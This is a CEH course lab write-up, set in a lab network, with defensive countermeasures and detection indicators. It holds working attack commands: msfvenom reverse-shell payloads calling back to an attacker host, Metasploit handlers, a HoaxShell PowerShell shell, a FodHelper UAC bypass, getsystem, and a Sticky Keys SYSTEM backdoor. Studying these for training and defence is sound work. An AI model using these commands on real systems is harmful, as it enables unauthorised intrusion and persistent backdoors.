# CEH System Hacking Labs: Comprehensive Write-up

**Course:** Certified Ethical Hacker (CEH)  
**Module:** 06 - System Hacking  
**Labs Completed:** 2  
**Date:** [Insert Date]  
**Author:** [Your Name]

---

## Table of Contents
1. [Lab 1: Gain Access Using Reverse Shell Generator](#lab-1)
2. [Lab 2: Privilege Escalation via UAC Bypass and Sticky Keys](#lab-2)
3. [Combined Security Analysis](#security-analysis)
4. [References](#references)

---

## Lab 1: Gain Access to a Remote System using Reverse Shell Generator {#lab-1}

### Objective
Demonstrate automated reverse shell generation and deployment to gain remote access to a target system using MSFVenom (Meterpreter) and PowerShell-based payloads.

### Lab Environment

| Machine | OS | IP Address | Credentials |
|---------|-----|-----------|-------------|
| Attacker Machine | Parrot Security | 10.10.1.13 | attacker/toor |
| Target Machine | Windows 11 | 10.10.1.11 | Admin/Pa$$w0rd |

### Theoretical Background

**Reverse Shell:** A connection initiated from the target system back to the attacker's system. Unlike bind shells, reverse shells bypass firewall restrictions by establishing outbound connections, which are typically allowed by most firewall configurations.

**Key Components:**
- **Payload Generation:** Creating malicious executable or script
- **Listener Setup:** Configuring attacker machine to receive connections
- **Payload Delivery:** Transferring payload to target system
- **Execution:** Running payload on victim machine
- **Post-Exploitation:** Executing commands on compromised system

### Attack Methodology

#### Phase 1: MSFVenom Payload Deployment

**Step 1: Environment Setup**
```bash
sudo su
# Password: toor
```

**Step 2: Initialize Reverse Shell Generator**
```bash
service apache2 stop
docker run -d -p 80:80 reverse_shell_generator
```
- Accessed web interface at `http://localhost`

**Step 3: Generate MSFVenom Payload**
- Configuration:
  - IP: 10.10.1.13
  - Port: 4444
  - Payload: Windows Meterpreter Staged Reverse TCP (x64)

Generated command:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f exe > reverse.exe
```

**Step 4: Setup Metasploit Listener**
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.1.13; set LPORT 4444; exploit"
```

**Step 5: Payload Delivery**
- Transferred `reverse.exe` via SMB share to `E:\CEH-Tools\CEHv13 Module 06 System Hacking`
- Accessed Windows 11 shared folder: `smb://10.10.1.11`

**Step 6: Payload Execution**
- Target machine: Executed `reverse.exe` from Desktop
- UAC prompt accepted with administrative privileges

**Step 7: Verification**
```bash
meterpreter > getuid
```
**Result:** Successfully established Meterpreter session with user context

---

#### Phase 2: PowerShell Payload Deployment

**Step 8: Generate PowerShell Payload**
- Selected HoaxShell → PowerShell IEX
- Modified port to 444
- Saved payload as `shell.ps1`

```bash
pluma shell.ps1
# Pasted PowerShell payload and saved
```

**Step 9: Setup HoaxShell Listener**
```bash
hoaxshell -s 10.10.1.13 -p 444
```

**Step 10: PowerShell Execution**
- Transferred `shell.ps1` to target machine
- Executed via PowerShell as Administrator:
```powershell
cd C:\Users\Admin\Desktop\
.\shell.ps1
```

**Step 11: Verification**
```bash
whoami
```
**Result:** Successfully established PowerShell shell session

### Results & Findings

#### MSFVenom Session
- **Payload Type:** Windows x64 Meterpreter Reverse TCP
- **Port:** 4444
- **Session Type:** Meterpreter (full-featured)
- **Status:** ✓ Successful

#### PowerShell Session
- **Payload Type:** PowerShell IEX
- **Port:** 444
- **Session Type:** Command Shell
- **Status:** ✓ Successful

### Key Observations
1. Reverse Shell Generator significantly simplified payload creation
2. Outbound connections successfully bypassed inbound firewall restrictions
3. Both binary and fileless execution vectors were effective
4. User execution remains critical vulnerability point
5. Administrative privileges enhanced compromise capabilities

---

## Lab 2: Privilege Escalation via UAC Bypass and Sticky Keys {#lab-2}

### Objective
Escalate privileges by bypassing User Account Control (UAC) and exploiting Windows Sticky Keys accessibility feature to gain persistent system-level access.

### Lab Environment

| Machine | OS | IP Address | Credentials |
|---------|-----|-----------|-------------|
| Attacker Machine | Parrot Security | 10.10.1.13 | attacker/toor |
| Target Machine | Windows 11 | 10.10.1.11 | Admin/Pa$$w0rd, Martin/apple |

### Theoretical Background

**Privilege Escalation Types:**
- **Horizontal:** Accessing resources of users with similar privileges
- **Vertical:** Gaining access to higher-privileged accounts (Admin/System)

**Sticky Keys Exploitation:**
Sticky Keys is a Windows accessibility feature allowing modifier keys to remain active after release. Activated by pressing Shift 5 times, it can be exploited to obtain unauthenticated, privileged access to the system.

**UAC Bypass:**
User Account Control (UAC) is a Windows security feature requiring authorization for administrative tasks. The FodHelper Registry Key method exploits Windows features to bypass UAC restrictions.

### Attack Methodology

#### Phase 1: Initial Access

**Step 1: Payload Generation**
```bash
sudo su
cd /root
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
```

**Step 2: Setup Shared Directory**
```bash
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
service apache2 start
```

**Step 3: Metasploit Listener Configuration**
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.1.13
set lport 444
run
```

**Step 4: Payload Delivery & Execution**
- Target accessed: `http://10.10.1.13/share`
- Downloaded and executed `Windows.exe`
- Meterpreter session established

**Step 5: Initial Reconnaissance**
```bash
meterpreter > sysinfo
meterpreter > getuid
```

**Findings:**
- **Domain:** WORKGROUP
- **Current User:** Limited privileges

---

#### Phase 2: UAC Bypass

**Step 6: Background Session**
```bash
meterpreter > background
```

**Step 7: UAC Bypass Module Selection**
```bash
msf > search bypassuac
msf > use exploit/windows/local/bypassuac_fodhelper
```

**Step 8: Configuration**
```bash
set session 1
set LHOST 10.10.1.13
set TARGET 0
show options
```

**Step 9: Exploitation**
```bash
exploit
```

**Result:** Successfully bypassed UAC protections

**Step 10: Privilege Elevation**
```bash
meterpreter > getsystem -t 1
meterpreter > getuid
```

**Result:** Elevated to SYSTEM privileges

---

#### Phase 3: Sticky Keys Exploitation

**Step 11: Deploy Sticky Keys Exploit**
```bash
meterpreter > background
msf > use post/windows/manage/sticky_keys
msf > sessions -i
msf > set session 2
msf > exploit
```

**Result:** Sticky Keys binary replaced with Command Prompt

**Step 12: Persistence Verification**
- Signed out from Admin account
- Signed into Martin account (standard user, no admin privileges)
- Locked system
- Pressed Shift key 5 times on lock screen

**Step 13: System Access Confirmation**
```cmd
C:\Windows\system32> whoami
nt authority\system
```

**Result:** Obtained persistent SYSTEM-level access without authentication

### Results & Findings

#### Privilege Escalation Success
- **Initial Access:** Standard user context
- **UAC Bypass:** Successfully bypassed using FodHelper method
- **Final Privileges:** NT AUTHORITY\SYSTEM
- **Persistence:** Sticky Keys backdoor enables lock screen access

#### Domain Information
- **Question Answer:** WORKGROUP (obtained from sysinfo command)

#### Attack Chain Summary
1. Initial foothold established via Meterpreter
2. UAC bypassed using FodHelper Registry Key exploit
3. Privileges escalated to SYSTEM using getsystem
4. Persistence achieved through Sticky Keys exploitation
5. System-level access maintained across user sessions

### Key Observations
1. UAC is not a security boundary and can be bypassed
2. Accessibility features can be weaponized for persistence
3. SYSTEM privileges provide complete control over target
4. Sticky Keys backdoor survives reboots and user logoffs
5. Attack requires initial administrative context for persistence setup

---

## Combined Security Analysis {#security-analysis}

### Attack Kill Chain Overview

```
1. Reconnaissance → 2. Weaponization → 3. Delivery → 4. Exploitation → 5. Installation → 6. Command & Control → 7. Actions on Objectives
```

**Lab 1 Coverage:** Steps 1-6 (Initial access establishment)  
**Lab 2 Coverage:** Steps 6-7 (Privilege escalation and persistence)

### Comprehensive Attack Vector Analysis

#### Initial Access Vectors
| Vector | Stealth | Effectiveness | AV Detection |
|--------|---------|---------------|--------------|
| MSFVenom Binary | Low | High | High |
| PowerShell Script | Medium | High | Medium |
| Web Delivery | Medium | High | Low |

#### Privilege Escalation Methods
| Method | Requirements | Success Rate | Persistence |
|--------|--------------|--------------|-------------|
| UAC Bypass (FodHelper) | User context | High | Session-based |
| Sticky Keys Exploit | SYSTEM privileges | Very High | Permanent |
| getsystem | Meterpreter session | High | Session-based |

### Defensive Countermeasures

#### Network Layer
1. **Egress Filtering:**
   - Block unusual outbound connections
   - Whitelist approved destinations
   - Monitor ports 4444, 444, and common reverse shell ports

2. **Network Monitoring:**
   - Deploy IDS/IPS systems
   - Analyze traffic patterns for C2 indicators
   - Implement network segmentation

#### Endpoint Layer
1. **Application Control:**
   - Implement whitelisting (e.g., AppLocker)
   - Restrict PowerShell execution policies
   - Disable unnecessary accessibility features

2. **Privilege Management:**
   - Enforce least privilege principle
   - Require MFA for administrative access
   - Regular privilege audits

3. **Execution Prevention:**
   - Enable Windows Defender Application Control
   - Configure PowerShell Constrained Language Mode
   - Implement execution policies

#### Detection & Response
1. **Monitoring Indicators:**
   - Unusual PowerShell execution
   - Modifications to accessibility binaries (sethc.exe)
   - Suspicious registry modifications (FodHelper keys)
   - Outbound connections to non-standard ports
   - getsystem technique usage

2. **Logging Requirements:**
   - Enable PowerShell script block logging
   - Monitor Windows Event Logs (4688, 4672)
   - Track file integrity of system binaries
   - Audit registry modifications

3. **Response Actions:**
   - Isolate compromised systems immediately
   - Analyze memory dumps for artifacts
   - Check for additional persistence mechanisms
   - Reset credentials for affected accounts
   - Rebuild compromised systems from clean images

#### Sticky Keys Specific Defenses
1. File integrity monitoring on `C:\Windows\System32\sethc.exe`
2. Registry monitoring for debugger attachments
3. Disable Sticky Keys on servers and workstations
4. Regular security audits of accessibility features

#### UAC Bypass Mitigation
1. Configure UAC to "Always Notify"
2. Monitor registry keys used in bypass techniques
3. Restrict user permissions to modify system directories
4. Deploy EDR solutions with UAC bypass detection

### Payload Detection Signatures

#### MSFVenom Indicators
- File hash analysis
- Known Meterpreter traffic patterns
- Staging behavior detection

#### PowerShell Indicators
- Base64 encoded commands
- IEX (Invoke-Expression) usage
- Network connections from PowerShell process
- Script block obfuscation

### Post-Exploitation Artifacts

#### Lab 1 Artifacts
- `reverse.exe` and `shell.ps1` files
- Network connections on ports 4444 and 444
- PowerShell execution logs
- Process injection indicators

#### Lab 2 Artifacts
- Modified `sethc.exe` binary
- Registry modifications (FodHelper keys)
- Meterpreter session artifacts
- Token manipulation evidence
- getsystem technique traces

---

## Ethical and Legal Considerations

⚠️ **CRITICAL NOTICE:** 
- These techniques are demonstrated for **authorized security testing only**
- Unauthorized access to computer systems is **illegal**
- Always obtain **written permission** before conducting security assessments
- Follow **responsible disclosure** practices
- Comply with all applicable laws and regulations

### Professional Use Cases
- Authorized penetration testing engagements
- Red team exercises with proper authorization
- Security research in controlled environments
- Educational purposes in isolated lab environments

---

## Tools & Technologies Summary

| Tool | Purpose | Version/Notes |
|------|---------|---------------|
| Parrot Security | Attack platform | Linux-based security OS |
| MSFVenom | Payload generation | Part of Metasploit Framework |
| Metasploit Framework | Exploitation and post-exploitation | msfconsole |
| HoaxShell | PowerShell payload listener | Python-based |
| Reverse Shell Generator | Automated payload creation | Docker container |
| Docker | Containerization | Version-agnostic |

---

## Lessons Learned

### Technical Insights
1. **Multi-Vector Approach:** Combining different payload types increases success probability
2. **Privilege Context Matters:** Initial access level determines escalation difficulty
3. **Persistence is Key:** Sticky Keys provides reliable backdoor mechanism
4. **Automation Benefits:** Tools like Reverse Shell Generator streamline attack workflows
5. **Defense in Depth:** Multiple security layers required to prevent these attacks

### Security Recommendations
1. **Network Security:** Implement egress filtering and monitor outbound connections
2. **Endpoint Protection:** Deploy modern EDR solutions with behavioral detection
3. **Access Control:** Enforce least privilege and segment network access
4. **User Training:** Educate users about social engineering and suspicious files
5. **Monitoring:** Implement comprehensive logging and SIEM solutions
6. **Patch Management:** Keep systems updated to prevent known exploits
7. **Configuration Hardening:** Disable unnecessary features and services

---

## Conclusion

These labs demonstrated a complete attack chain from initial access through privilege escalation and persistence establishment. Key findings include:

**Attack Effectiveness:**
- Reverse shells successfully bypassed perimeter defenses
- UAC bypass techniques remain effective against default configurations
- Sticky Keys exploitation provides reliable persistence mechanism
- Multiple payload types improve attack success rates

**Defensive Gaps:**
- Default UAC settings insufficient for security
- Accessibility features present security risks
- Outbound connections often inadequately monitored
- User execution remains critical vulnerability

**Mitigation Priority:**
1. Implement application whitelisting
2. Enable comprehensive logging and monitoring
3. Deploy EDR with behavioral detection
4. Restrict PowerShell execution
5. Harden accessibility features
6. Enforce egress filtering

**Lab Outcomes:**
- ✓ Successfully established reverse shell connections via MSFVenom and PowerShell
- ✓ Bypassed UAC using FodHelper Registry Key method
- ✓ Escalated privileges to SYSTEM level
- ✓ Established persistent backdoor via Sticky Keys exploitation
- ✓ Demonstrated complete compromise of Windows 11 target system

---

## References {#references}

### Official Documentation
- Microsoft Security Documentation: https://docs.microsoft.com/security
- Metasploit Framework Documentation: https://docs.metasploit.com
- MITRE ATT&CK Framework: https://attack.mitre.org

### Relevant MITRE ATT&CK Techniques
- **T1059.001:** Command and Scripting Interpreter: PowerShell
- **T1071.001:** Application Layer Protocol: Web Protocols
- **T1548.002:** Abuse Elevation Control Mechanism: Bypass UAC
- **T1546.008:** Event Triggered Execution: Accessibility Features
- **T1134:** Access Token Manipulation
- **T1068:** Exploitation for Privilege Escalation

### Additional Reading
- PowerShell Attack Vectors and Mitigation Strategies
- Windows Privilege Escalation Techniques
- Reverse Shell Detection and Prevention
- Endpoint Detection and Response Best Practices

---

## Appendix: Lab Completion Checklist

### Lab 1: Reverse Shell Generator
- [x] Environment setup and preparation
- [x] Reverse Shell Generator installation via Docker
- [x] MSFVenom payload generation (reverse.exe)
- [x] Metasploit listener configuration (port 4444)
- [x] Payload transfer via SMB
- [x] Meterpreter session establishment
- [x] PowerShell payload generation (shell.ps1)
- [x] HoaxShell listener configuration (port 444)
- [x] PowerShell session establishment
- [x] Verification of both sessions
- [x] Documentation of findings
- [x] Cleanup and artifact removal

### Lab 2: Privilege Escalation
- [x] Initial payload creation (Windows.exe)
- [x] Web server setup for payload delivery
- [x] Metasploit listener configuration (port 444)
- [x] Initial Meterpreter session establishment
- [x] System reconnaissance (sysinfo, getuid)
- [x] UAC bypass using bypassuac_fodhelper
- [x] Privilege escalation to SYSTEM (getsystem)
- [x] Sticky Keys exploitation module deployment
- [x] Persistence verification via lock screen
- [x] SYSTEM access confirmation (whoami)
- [x] Documentation of domain information (WORKGROUP)
- [x] Cleanup and system restart

---

**Lab Completion Date:** [Insert Date]  
**Total Time Spent:** Approximately 90 minutes  
**Difficulty Level:** Advanced  
**Lab Status:** ✓ COMPLETED

---

**Document Version:** 1.0  
**Last Updated:** [Insert Date]  
**Prepared By:** [Your Name]  
**Course:** Certified Ethical Hacker (CEH v13)  
**Module:** 06 - System Hacking

---

*This document is prepared for educational purposes as part of authorized CEH training. All activities were conducted in a controlled laboratory environment with proper authorization.*
